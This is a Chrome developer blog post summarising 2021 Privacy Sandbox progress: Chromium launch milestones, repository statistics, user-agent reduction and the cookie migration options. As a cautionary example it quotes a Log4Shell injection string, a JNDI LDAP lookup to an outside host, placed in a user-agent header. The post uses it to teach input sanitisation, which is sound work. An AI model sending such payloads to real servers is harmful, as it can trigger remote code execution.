---
title: Progress in the Privacy Sandbox (December 2021)
description: >
  Looking back at stats from 2021 and some resolutions for tackling user-agent and cookies in 2022.
layout: 'layouts/blog-post.njk'
date: 2022-01-07
authors:
  - rowan_m
hero: 'image/VWw0b3pM7jdugTkwI6Y81n6f5Yc2/Ut0IykTaEFBuOA5EHqbg.png'
alt: >
  Privacy Sandbox logo
tags:
  - progress-in-the-privacy-sandbox
  - privacy
---

Welcome to the 2021 wrap-up edition of **[Progress in the Privacy
Sandbox](/tags/progress-in-the-privacy-sandbox/)**, tracking the milestones on
the path to phasing out third-party cookies in Chrome and working towards a more
private web. Normally, we share an overview of updates to the **[Privacy Sandbox
timeline](https://privacysandbox.com/timeline/)** along with news from across
the project, but December was a quiet month. Instead, we'll look back at some of
the activities over 2021 and provide a few potential resolutions you can make
now we are in the new year.

## Chromium development process

For a new web platform feature to land in Chromium, it needs to go through the
[project's open development
process](https://www.chromium.org/blink/launching-features). In 2021, the
Privacy Sandbox team produced:

<figure>
  <table style="font-size: 140%; font-weight: bold; font-variant-numeric: tabular-nums;">
  <tr><td>🥚</td><td>Intent to Prototype </td>     <td>19</td></tr>
  <tr><td>🧪</td><td>Intent to Experiment</td><td>&nbsp;7</td></tr>
  <tr><td>🚀</td><td>Intent to Ship      </td>     <td>11</td></tr>
  </table>
  <figcaption>
    <a href="https://docs.google.com/spreadsheets/d/e/2PACX-1vR-5YYZ-lxG9xelJFCYM2yajUEWUNKZkiXcWX9BYi8dSUV_5Xrhd5u-iyNNf4w8NAVwrSrVWjeNrC-i/pubhtml#">Source</a>
  </figcaption>
</figure>

Each milestone is also an invitation for the wider web ecosystem to contribute.

An **Intent to Prototype** is the first checkpoint, where we invite discussion
and early experimentation. This means a proposal will be available on GitHub,
where **you can ask a question by creating an Issue** or **[join discussions and
presentations in standards
groups](/docs/privacy-sandbox/cds21-update/#discussion)** such as the W3C and
IETF. This is also where coding begins, which means you can **expect the
prototype functionality to be made available for developer testing behind a
[feature
flag](https://www.chromium.org/developers/how-tos/run-chromium-with-flags)**.
Initial feedback is critical for validating and iterating on proposals.

An **Intent to Experiment** is an optional step if we’d like to request an
origin trial. Developers **can [sign up for the origin
trial](/blog/origin-trials/)** of a feature, and then **test it in production**.
It's called an experiment because we have specific aspects of the feature we
want to validate in real-world environments. Developers that can **test and
share the results of those tests** provide valuable feedback to help iterate and
evolve the feature.

An **Intent to Ship** is the final milestone which signals that a feature is now
complete and ready for general availability. Once approved, the feature is
merged into an upcoming release and then progresses through the Canary, Beta,
and Stable channels. It's critical to ensure you **test your sites with the
[Canary](https://www.google.com/chrome/canary/) and
[Beta](https://www.google.com/chrome/beta/) versions of Chrome** to catch and
report any bugs before a feature reaches Stable.

## Proposals

Each Privacy Sandbox proposal has an accompanying GitHub repository. A
repository hosts an explainer to summarize overall functionality, a detailed
specification for implementation by browsers, and contributions from across the
web ecosystem in the form of Issues and Pull Requests.

Across 14 Privacy Sandbox repositories, we had:

<figure>
  <table style="font-size: 140%; font-weight: bold; font-variant-numeric: tabular-nums;">
    <tr><td rowspan="2">💬</td><td>545</td><td>Issues created</td></tr>
    <tr>                       <td>250</td><td>Issues closed</td></tr>
    <tr><td rowspan="2">🛠️</td><td>261</td><td>Pull Requests created</td></tr>
    <tr>                       <td>223</td><td>Pull Requests merged</td></tr>
  </table>
  <figcaption>
    <a href="https://docs.google.com/spreadsheets/d/e/2PACX-1vR-5YYZ-lxG9xelJFCYM2yajUEWUNKZkiXcWX9BYi8dSUV_5Xrhd5u-iyNNf4w8NAVwrSrVWjeNrC-i/pubhtml#">Source</a>
  </figcaption>
</figure>

The language in explainers and specifications is often targeted to an audience
already familiar with standards and browser development, which can be
challenging if you're unfamiliar with it. However, the aim of an explainer is to
explain! If there are points that are unclear or not covered, **we want you to
raise an Issue** so we can update and clarify the explainer.

## Resolutions

### User-agent spring cleaning

As we were counting _down_ to the New Year, we're also counting _up_ to both
[Chrome 100](/blog/force-major-version-to-100/) and the incremental [reduction
of the user-agent string](/docs/privacy-sandbox/user-agent/). This is a good
motivator to revisit any usage of the user-agent string in your code to check if
it's affected by either of these changes.

To find those areas:

1. Search for `navigator.userAgent` in your JavaScript code, or access to the
   `User-Agent` header in your server code.
2. Check your parsing of the string for assumptions about a 2 digit version. For
   example, a regex that specifies `\d\d` or `\d{2}` should be replaced with
   `\d+`.
3. Check your use of the string for anywhere you rely on the:
    * platform (operating system) version
    * full Chrome build version
    * mobile device name
4. These are the values that will be reduced to fixed strings in the future. If
   you need access to these values, [migrate to User-Agent Client
   Hints](https://web.dev/migrate-to-ua-ch/).

There is one December update to mention—if you are adopting User-Agent Client
Hints, we have sent the **Intent to Ship to [enable delegating hints to other
origins in
HTML](https://groups.google.com/a/chromium.org/g/blink-dev/c/JQ68cvYuiQU/m/S_33YSqxCwAJ)**
via a `<meta>` tag. For example:

```html
<meta name="accept-ch" content="sec-ch-ua-model=( https://foo.bar )">
```

If you're in an enthusiastic spring cleaning mood, you can also consider
alternatives to the use of user-agent altogether. If you're using the string to
detect mobile devices, then investigate if you can replace this with responsive
design. If you're checking the browser name and version for feature support, see
if you can use feature detection instead.

It's always worth remembering that the user-agent, like any client provided
value, is not guaranteed to be accurate or even provided. The recent [Log4j
vulnerability, "Log4shell"](https://logging.apache.org/log4j/2.x/security.html)
provides an example of this risk. A client that sets its user-agent string to
include a value like `${jndi:ldap://example.com/file}` may be able to get a site
to actively parse that on the server.

{% Aside 'caution' %}

It's critical that you treat user-agent in the same way as any other form of
user input: sanitize and validate it before acting on the value.

{% endAside %}

### Cookie cataloguing

Another traditional new year activity is to make sure you're happy that you have
a healthy number of cookies with quality ingredients. As we continue moving
towards the phase out of third-party cookies, you should make sure you know
which of your site's cookies will be affected. 2020 provided a headstart as it
became necessary to [mark all cookies for cross-site or third-party
use](https://web.dev/samesite-cookies-explained/#samesitenone-must-be-secure)
with `SameSite=None`. 

Any cookie where you have set the `SameSite` attribute to `None` will need an
update.

There are three possible routes to consider at the moment:

1. If the cookie is only required in a 1:1 relationship with the top-level site,
   then follow the progress of the **[CHIPS
   proposal](https://github.com/WICG/CHIPS)**. This will mean adding the
   `Partitioned` attribute to the cookie.
2. If the cookie is used in a cross-site context, but only across sites that you
   own and operate, then it may be a candidate for **[First-Party
   Sets](/docs/privacy-sandbox/first-party-sets/)**. This requires defining the
   sites in the set and adding the `SameParty` attribute to the cookie.
3. If the cookie is used to provide some form of shared value across multiple
   sites, investigate the wider set of [Privacy Sandbox
   proposals](/docs/privacy-sandbox/) for an alternative solution that does not
   rely on cross-site tracking.

If you're feeling especially health-conscious, then this is also an ideal time
to revisit all of your cookie usage, as we have a good recipe to improve your
first-party cookies too.

{% YouTube id='1g2uQfP1Q3U' %}

## Feedback

As we continue to publish these monthly updates, and progress through the
Privacy Sandbox as a whole, we want to make sure that developers receive the
information and support that they need. Let us know on [@ChromiumDev
Twitter](https://twitter.com/ChromiumDev) if there's anything that we could
improve in this series. We'll use your input to continue improving the format.

Check out the **[Privacy Sandbox FAQ](/docs/privacy-sandbox/faq/)**, which we
continue to expand based on the issues you submit to the [developer support
repo](https://github.com/GoogleChromeLabs/privacy-sandbox-dev-support). If you
have any questions around testing or implementation on any of the proposals,
come talk to us there.
